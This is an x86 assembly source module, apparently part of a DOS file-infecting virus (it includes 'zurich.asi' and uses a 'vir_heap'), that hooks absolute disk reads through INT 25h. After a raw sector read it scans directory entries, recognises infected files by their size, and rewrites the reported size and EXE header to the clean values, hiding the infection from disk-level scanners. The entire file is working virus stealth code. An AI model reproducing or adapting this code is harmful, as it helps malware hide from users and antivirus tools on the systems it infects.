include zurich.asi
code segment byte public
assume cs:code, ds:code, es:code, ss:code
extrn   offset25            :dword
extrn   call_real_25        :near
extrn   restore_header      :near
extrn   stealthname         :near
extrn   test_size           :near
extrn   doscall             :near
extrn   get_sft             :near
extrn   dosread             :near
extrn   heap                :near
extrn   dosclose            :near
extrn   vir_heap            :near
;-+------------------------------------------------------------------------+-
;-+-[ stealth 25 ]---------------------------------------------------------+-
;-+------------------------------------------------------------------------+-
;-+------------------------------------------------------------------------+-
; dir entry stealth
; DS:SI = @dir_size_h
;-+------------------------------------------------------------------------+-
pblabel Stealth_Abs
    ifInfJump   Buf
    mov  ds:[si+(dir_size_l-dir_size_h)],ax ;stealth patch size in dir entry
    mov  ds:[si+(dir_size_h-dir_size_h)],dx
    ret
;-+------------------------------------------------------------------------+-
; exe header int25 stealth ?
;-+------------------------------------------------------------------------+-

pblabel Stealth_Abs_r
    ifInfJump   Buf
    push    ds
    MOVSEG  ds, ss
    push    ax dx  ;real file size
    lea     dx, file_for_fake_open
    mov     ax, 3D40h ;open readonly
    call    DosCall
    xchg    bx, ax ; DPB offset in AX
    pop     dx ax
    DOIF NC
        push    bx  ;handle
        call    get_sft
;        mov     es:[di.sf_position.lo], ax
;        mov     es:[di.sf_position.hi], dx
        push    ax dx ;file size
        inc     ah
        mov     es:[di.sf_size.lo], ax
        mov     es:[di.sf_size.hi], dx
        mov     dl, [abs_read_drive] ;<<<<< gluk
        and     byte ptr es:[di+5], 11100000b
        add     byte ptr es:[di+5], dl
        inc     dx       ;future: flop no stealth ? (to slow)
        mov     ah, 32h
        call    DosCall
        mov     es:[di.sf_devptr.lo], bx
        mov     es:[di.sf_devptr.hi], ds
        xor     cx, cx
        mov     dx, [start_sec.hi]
        mov     ax, [start_sec.lo]
        sub     ax, ds:dpb_first_sector[bx]
        sbb     dx, cx
        mov     cl, ds:dpb_cluster_mask[bx]
        inc     cx
        div     cx
        and     dx, dx ;if DX != 0 - error
        DOIF Z
            inc     ax
            inc     ax
            mov     es:[di.sf_firclus], ax
            mov     word ptr es:[di+35h], ax
        DONE
        pop     dx ax ;file size
        pop     bx
        push    si
        call    restore_header
        pop     di
        scasw   ;add di,2
        pop     es
        push    es
        lea     si, [heap]
        mov     cx, 16h/2
        rep     movsw
        call    dosclose
    DONE
    pop     ds
    ret
file_for_fake_open equ StealthName
;-+------------------------------------------------------------------------+-
; test after absolute read for exe-header & dir entry
;-+------------------------------------------------------------------------+-
pblabel st25
    mov     si, bx
    xor     ax, ax  ;AbsDisk_start_sect.hi
    cmp     cx, -1  ;(inc cx, jz)?
    DOIF E
        mov     dx, ds:[bx.AbsDisk_start_sect.lo]
        mov     ax, ds:[bx.AbsDisk_start_sect.hi]
        lds     si, ds:[bx.AbsDisk_buffer]
    DONE            ;here, DS:SI - read buffer
    mov     [start_sec.hi], ax
    mov     [start_sec.lo], dx
    push    si
    lea     di, [vir_heap._exehdr]
    MOVSEG  es, cs
    mov     cx, HDRBUFSIZE/2
    rep     movsw
    pop     si
    call    Stealth_Abs_r
    DO
        lodsb                            ;1
        cmp     al, 0
        DOIF Z
end_search: ret
        DONE
        mov     cx, 10d
        DO
            lodsb                        ;0B
            cmp     al, ' '
            jb      end_search          ;no_dir_entry
        CYCLE LU
        lodsb ;attr of file              ;15
        mov     cx, 10d
        DO
            lodsb                        ;16
            cmp     al, 0      ;unused, must be zero
            jnz     end_search ;no_dir_entry
        CYCLE LU
        add     si, 6
        lodsw            ;dir_size_l
        call    test_size
        DOIF Z
            mov     dl, [abs_read_drive] ; = $-1
            inc     dx       ;future: flop no stealth ? (to slow)
            push    ds
            mov     ah, 32h
            call    DosCall
            mov     cl, ds:dpb_cluster_mask[bx]
            mov     ch, 0
            inc     cx
            mov     bx, ds:dpb_first_sector[bx]
            pop     ds
            mov     ax, ds:(dir_first-dir_size_h)[si]
            dec     ax
            dec     ax
            cwd
            mul     cx
            add     ax, bx
            adc     dx, 0 ;dx:ax-first sector
            push    ds
            MOVSEG  ds, cs
            lea     bx, [heap]
            mov     word ptr [bx.AbsDisk_start_sect.lo], ax
            mov     word ptr [bx.AbsDisk_start_sect.hi], dx
            mov     word ptr [bx.AbsDisk_sect_num], 1
            mov     word ptr [bx.AbsDisk_buffer.lo], bx
            mov     word ptr [bx.AbsDisk_buffer.hi], ds
            mov     al, [abs_read_drive]
            mov     cx, -1
            call    call_real_25
            push    si
            mov     cx, HDRBUFSIZE/2
            lea     si, [heap]
            lea     di, [vir_heap._exehdr]
            movseg  es, cs
            rep     movsw
            pop     si
            pop     ds
            call    Stealth_Abs
        DONE
        lodsw
    CYCLE
;-+------------------------------------------------------------------------+-
ends
end
